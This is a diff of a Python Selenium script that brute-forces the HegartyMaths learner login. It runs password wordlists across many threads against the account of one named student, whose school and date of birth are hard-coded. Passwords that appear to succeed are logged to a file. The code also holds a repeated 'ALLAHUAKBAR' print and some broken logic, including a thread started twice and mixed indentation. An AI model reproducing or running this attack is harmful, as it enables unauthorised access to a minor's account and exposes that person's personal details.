@@ -10,28 +10,13 @@ from selenium import webdriver
 from optparse import OptionParser
 from selenium.webdriver.common.keys import Keys
 from selenium.common.exceptions import NoSuchElementException
-possiblepasswords=open("possible.txt","a")
-
-#Config#
 parser = OptionParser()
 now = datetime.datetime.now()
-
-#Args
-parser.add_option("-u", "--username", dest="username",help="Choose the username")
-parser.add_option("--usernamesel", dest="usernamesel",help="Choose the username selector")
-parser.add_option("--passsel", dest="passsel",help="Choose the password selector")
-parser.add_option("--loginsel", dest="loginsel",help= "Choose the login button selector")
-parser.add_option("--passlist", dest="passlist",help="Enter the password list directory")
-parser.add_option("--website", dest="website",help="choose a website")
-(options, args) = parser.parse_args()
-
 def reset(Sel_pas):
    for _ in range(23): Sel_pas.send_keys(Keys.BACK_SPACE)
 CHROME_DVR_DIR = 'C:\webdrivers\chromedriver.exe'
-
 def wizard():
     website = "https://hegartymaths.com/login/learner"
-
     school_selector = "body > div.container > div > div > div.pr > input"
     username_selector1 = "body > div.container > div > div > form > div:nth-child(1) > div > input:nth-child(1)"
     username_selector2 = "body > div.container > div > div > form > div:nth-child(1) > div > input:nth-child(2)"
@@ -43,47 +28,32 @@ def wizard():
     login_btn_selector = "body > div.container > div > div > form > p.text-center > button"
     failed_btn_selector = "body > div.sweet-alert.showSweetAlert.visible > div.sa-button-container > div > button"
     #body > div.sweet-alert.showSweetAlert.visible > div.sa-button-container > div > button
-
     school="Queensmead School" #enter school name here
     username5="2007"#year e.g. 2007
     username4="August"#month e.g. January
     username3="30"#day e.g. 4
     username2= "Edwards"#lastname e.g. Doe
     username1 = "Ryan"#firstname e.g. Jhon
+    pass_list="C:/actualwordlist/wordlist"+numberofconcurrent+".txt"# ACTUAL F FILE
+    brutes(pore,donesofar,failed_btn_selector,school,website,username5,username4,username3,username2,username1,pass_list,school_selector,username_selector1,username_selector2,username_selector3,username_btn_selector,username_selector4,username_selector5,password_selector,login_btn_selector)
 
-    howmanyconcurrent = "howmanyconcurrent.txt"
-    with open(howmanyconcurrent,'r') as concurrent: donesofar,numberofconcurrent,pass_list=0,str((concurrent.readlines())[0]),"a" #cc file made
-    pass_list="C:/Python27/wordlist"+numberofconcurrent+".txt"# ACTUAL F FILE
-    brutes(pore,donesofar,howmanyconcurrent,failed_btn_selector,school,website,username5,username4,username3,username2,username1,pass_list,school_selector,username_selector1,username_selector2,username_selector3,username_btn_selector,username_selector4,username_selector5,password_selector,login_btn_selector)
-
-def brutes(pore,donesofar,howmanyconcurrent,failed_btn_selector,school,website,username5,username4,username3,username2,username1,pass_list,school_selector,username_selector1,username_selector2,username_selector3,username_btn_selector,username_selector4,username_selector5,password_selector,login_btn_selector):
-    howmanyconcurrent = "howmanyconcurrent.txt"
-    concurrent= open(howmanyconcurrent,'r')
-    numberofconcurrent=(concurrent.readlines())[0]
-    concurrent.close()
-    concurrento=open(howmanyconcurrent,'w')
-    numberofconcurrent=int(numberofconcurrent)+1#cc
-    concurrento.write(str(numberofconcurrent))
-    concurrento.close()
-    
+def brutes(pore,donesofar,failed_btn_selector,school,website,username5,username4,username3,username2,username1,pass_list,school_selector,username_selector1,username_selector2,username_selector3,username_btn_selector,username_selector4,username_selector5,password_selector,login_btn_selector):
     f=pore
     print(len(f))#if this returns 0 then do f=open("C:\python27\<filename>.txt","r")
     #driver = webdriver.Chrome(CHROME_DVR_DIR)#prevents unnecessary excess tab launch
     optionss = webdriver.ChromeOptions()
     optionss.add_argument("--disable-popup-blocking")
-    print('disabled popup blocking')
     optionss.add_argument("--disable-extensions")
-    print('disabled extensions')
     count,browser,COUNTERRRR= 1,webdriver.Chrome(CHROME_DVR_DIR),1 
     while True:
             browser.get(website)
-            t.sleep(1)
+            t.sleep(2)
             while COUNTERRRR!=0:
               Sel_school = browser.find_element_by_css_selector(school_selector) #Finds Selector
               Sel_school.send_keys(school)
-              t.sleep(5)
+              t.sleep(7)
               Sel_school.send_keys(Keys.RETURN)
-              t.sleep(1)
+              t.sleep(2)
               COUNTERRRR=COUNTERRRR-1
             Sel_user1 = browser.find_element_by_css_selector(username_selector1) #Finds Selector
             Sel_user2 = browser.find_element_by_css_selector(username_selector2) #Finds Selector
@@ -113,13 +83,15 @@ def brutes(pore,donesofar,howmanyconcurrent,failed_btn_selector,school,website,u
                        try:
                              failed = browser.find_element_by_css_selector(failed_btn_selector)
                              failed.send_keys(Keys.RETURN)
-			     t.sleep(1)
+			                 t.sleep(1)
                              bp=1
                        except: 
+			 try:
 			     Sel_pas.send_keys(Keys.ENTER)
 			     t.sleep(1)
-                             print('\rFailed element not found!', end='')
-                             bp=0
+                 print('\rFailed element not found!', end='')
+                 bp=0
+			 except:print("passed")
                     print('\rTried password: '+line+' for '+username1+' '+username2+'.')
                     donesofar=donesofar+1
             except KeyboardInterrupt:
@@ -130,10 +102,10 @@ def brutes(pore,donesofar,howmanyconcurrent,failed_btn_selector,school,website,u
                 print('LAST PASS ATTEMPT BELOW OR ABOVE')
                 temp=line
                 print('Password has been found: '+temp)
-                print("ALLAHUAKBAR"*10000)
-                possiblepasswords.write("The key: |"+str(temp)+"| is possible, at index:"+str(f.index(temp)))
-                possiblepasswords.write(" or it could mean that the previous key was successful: "+str(f[(f.index(temp))-1])+" or.."+str(f[(f.index(temp))-2])+"\n")
-                possiblepasswords.close()
+                print("ALLAHUAKBAR"*1000)
+		with open("possible.txt","a") as possiblepasswords:
+                	possiblepasswords.write("The key: |"+str(temp)+"| is possible, at index:"+str(f.index(temp)))
+                	possiblepasswords.write(" or it could mean that the previous key was successful: "+str(f[(f.index(temp))-1])+" or.."+str(f[(f.index(temp))-2])+"\n")
                 exit()
 
 banner ='''
@@ -161,8 +133,18 @@ t14=threading.Thread(target=wizard)
 t15=threading.Thread(target=wizard)
 t16=threading.Thread(target=wizard)
 t17=threading.Thread(target=wizard)
+t18=threading.Thread(target=wizard)
+t19=threading.Thread(target=wizard)
+t20=threading.Thread(target=wizard)
 #needs fake threads to open actual active processers, preferrably 2n
-with open("C:\Python27\wordlist1.txt","r") as openagain:#change wordlist if needed
+
+with open("howmanyconcurrent.txt",'r') as concurrent:numberofconcurrent=(concurrent.readlines())[0]
+with open("howmanyconcurrent.txt",'w') as concurrento:
+    numberofconcurrent=int(numberofconcurrent)+1#cc
+    concurrento.write(str(numberofconcurrent))
+with open("howmanyconcurrent.txt",'r') as concurrent: donesofar,numberofconcurrent,pass_list=0,str((concurrent.readlines())[0]),"a" #cc file made
+
+with open("C:/actualwordlist/wordlist"+numberofconcurrent+".txt","r") as openagain:#change wordlist if needed
   pof,al,alist,now="",0,[],0
   for i in openagain:
      pof,al,pgsla="",al+1,list(str(i))
@@ -176,18 +158,16 @@ with open("C:\Python27\wordlist1.txt","r") as openagain:#change wordlist if need
         now=now+1
         pass
      else:
-        pof=""
-        al=al+1#al=how many lines
+        al,pof=al+1,""
         pgsla=list(str(i))
         for o in range(0,1):pgsla.pop()
         for k in pgsla: pof=pof+k
         alist.append(pof)
   skipper=al//8
 p,reallylong=[],[]
-list1,list2,list3,list4,list5,list6,list7,list8,list9=[],[],[],[],[],[],[],[],[]#add more lists if you'd like, manually
-howspicy=9 #change to how many concurrent tabs you think your cpu can handle.
+list1,list2,list3,list4,list5,list6,list7,list8,list9,list10=[],[],[],[],[],[],[],[],[],[]
+howspicy=9
 for k in range(1,howspicy+1):p.append(k)
-p.reverse()
 for i in range(1,(len(alist)//howspicy)):reallylong.append(i)
 for i in reallylong:
       list1.append(alist[(howspicy*i)-howspicy-2])
@@ -199,7 +179,8 @@ for i in reallylong:
       list7.append(alist[(howspicy*i)-howspicy-8])
       list8.append(alist[(howspicy*i)-howspicy-9])
       list9.append(alist[(howspicy*i)-howspicy-10])
-      #dont forget to add the same amount here aswell, then increment the above e.g. 10 -> 11.
+      list10.append(alist[(howspicy*i)-howspicy-11])
+
 print(banner)
 t.sleep(1)
 pore=list1
@@ -236,3 +217,11 @@ t8.start()
 t.sleep(1)
 pore=list9
 t9.start()
+
+t.sleep(1)
+pore=list10
+t10.start()
+
+t.sleep(1)
+pore=list10
+t10.start()
